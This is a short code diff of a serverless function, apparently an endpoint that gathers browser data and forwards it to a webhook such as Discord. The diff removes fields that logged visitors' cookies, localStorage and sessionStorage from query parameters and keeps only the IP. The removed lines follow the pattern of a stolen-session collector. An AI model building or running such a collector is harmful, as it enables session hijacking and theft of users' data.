@@ -10,14 +10,7 @@ exports.handler = async function (event, context) {
   const query = event.queryStringParameters;
 
   const log = {
-    ip,
-    cookies: query.cookies,
-    localStorage: query.localStorage,
-    sessionStorage: query.sessionStorage,
-    url: query.url,
-    origin: query.origin,
-    userAgent: query.userAgent,
-    timestamp: new Date().toISOString()
+    ip
   };
 
   // ارسال به Webhook (مثلاً Discord)
